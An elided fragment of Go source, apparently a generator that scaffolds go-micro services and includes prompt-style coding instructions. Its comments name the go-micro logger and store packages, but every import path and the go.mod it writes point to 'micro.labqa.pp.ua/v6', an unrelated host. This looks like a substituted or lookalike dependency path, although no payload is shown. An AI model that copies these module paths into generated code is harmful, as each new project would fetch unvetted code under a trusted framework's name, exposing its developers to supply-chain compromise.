...
// goMicroVersion is the micro.labqa.pp.ua/v6 release pinned into the go.mod of
...
3. Import go-micro logger as: log "micro.labqa.pp.ua/v6/logger"
4. Import "github.com/google/uuid" for ID generation
5. Use "micro.labqa.pp.ua/v6/store" for persistent storage (NOT in-memory maps)
...
For storage, use the go-micro store package:
  import "micro.labqa.pp.ua/v6/store"
...
func generateStructure(dir string, svc ServiceSpec) error {
	...
	if !exists {
		...
		writeFile(filepath.Join(dir, "go.mod"),
			fmt.Sprintf("module %s\n\ngo 1.24\n\nrequire micro.labqa.pp.ua/v6 %s\n", name, goMicroVersion))
